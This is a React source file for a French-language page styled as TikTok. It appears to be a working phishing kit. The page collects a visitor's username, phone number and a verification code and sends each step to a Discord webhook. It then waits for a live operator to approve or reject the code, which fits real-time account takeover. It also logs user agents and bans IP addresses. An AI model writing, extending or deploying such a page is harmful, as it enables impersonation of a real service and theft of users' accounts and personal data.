import { useState, useEffect, useRef } from "react";
import { supabase } from "@/integrations/supabase/client";
import TikTokLogo from "@/components/tiktok/TikTokLogo";
import TikTokDisclaimer from "@/components/tiktok/TikTokDisclaimer";
import TikTokForm from "@/components/tiktok/TikTokForm";
import TikTokCode from "@/components/tiktok/TikTokCode";
import TikTokWaiting from "@/components/tiktok/TikTokWaiting";
import TikTokSuccess from "@/components/tiktok/TikTokSuccess";

type Step = "form" | "code" | "waiting" | "success" | "banned";

const TikTok = () => {
  const [step, setStep] = useState<Step>("form");
  const [formData, setFormData] = useState({ username: "", phone: "", plan: "" });
  const [submissionId, setSubmissionId] = useState<string | null>(null);
  const [codeError, setCodeError] = useState("");
  const [formError, setFormError] = useState("");
  const [banReason, setBanReason] = useState<string | null>(null);
  const visitTracked = useRef(false);
  const formSubmittingRef = useRef(false);
  const ipChecked = useRef(false);

  useEffect(() => {
    if (ipChecked.current) return;
    ipChecked.current = true;
    supabase.functions.invoke('check-ip-ban').then(({ data }) => {
      if (data?.banned) {
        setBanReason(data.reason);
        setStep("banned");
      }
    }).catch(console.error);
  }, []);

  useEffect(() => {
    if (visitTracked.current || step === "banned") return;
    visitTracked.current = true;
    supabase.from('visits').insert({ user_agent: navigator.userAgent }).then(() => {
      console.log('Visit tracked');
    });
  }, [step]);

  useEffect(() => {
    if (!submissionId || step !== "waiting") return;
    const channel = supabase
      .channel(`submission-${submissionId}`)
      .on('postgres_changes', {
        event: 'UPDATE', schema: 'public', table: 'submissions',
        filter: `id=eq.${submissionId}`
      }, (payload) => {
        const newStatus = payload.new.status;
        if (newStatus === 'approved') setStep("success");
        else if (newStatus === 'rejected') {
          setCodeError("Code refusé. Veuillez réessayer.");
          setStep("code");
        }
      }).subscribe();
    return () => { supabase.removeChannel(channel); };
  }, [submissionId, step]);

  const handleFormSubmit = async (data: { username: string; phone: string; plan: string }) => {
    if (formSubmittingRef.current) return;
    formSubmittingRef.current = true;
    setFormError("");
    setFormData(data);

    try {
      const { data: response, error } = await supabase.functions.invoke('discord-webhook', {
        body: { ...data, step: "form", source: "tiktok" }
      });
      if (error) {
        setFormError("Une erreur est survenue. Veuillez réessayer.");
        formSubmittingRef.current = false;
        return;
      }
      if (response?.submissionId) setSubmissionId(response.submissionId);
      setStep("code");
    } catch {
      setFormError("Une erreur est survenue. Veuillez réessayer.");
    } finally {
      formSubmittingRef.current = false;
    }
  };

  const handleCodeSubmit = async (code: string) => {
    setCodeError("");
    try {
      await supabase.functions.invoke('discord-webhook', {
        body: { ...formData, code, step: "code", submissionId, source: "tiktok" }
      });
    } catch (error) {
      console.error("Error sending to Discord:", error);
    }
    setStep("waiting");
  };

  return (
    <div className="min-h-screen bg-[#121212] flex flex-col items-center justify-center px-4 py-12">
      <div className="flex flex-col items-center gap-8 w-full max-w-md">
        <TikTokLogo />
        <TikTokDisclaimer />

        {step === "form" && (
          <TikTokForm onSubmit={handleFormSubmit} externalError={formError} />
        )}
        {step === "code" && (
          <TikTokCode onSubmit={handleCodeSubmit} error={codeError} />
        )}
        {step === "waiting" && <TikTokWaiting />}
        {step === "success" && <TikTokSuccess />}
        {step === "banned" && (
          <div className="text-center space-y-4">
            <div className="text-6xl">🚫</div>
            <h2 className="text-2xl font-bold text-[#FE2C55]">Accès Refusé</h2>
            <p className="text-gray-400">Votre adresse IP a été bannie de cette plateforme.</p>
            {banReason && <p className="text-sm text-gray-500">Raison : {banReason}</p>}
          </div>
        )}
      </div>
    </div>
  );
};

export default TikTok;
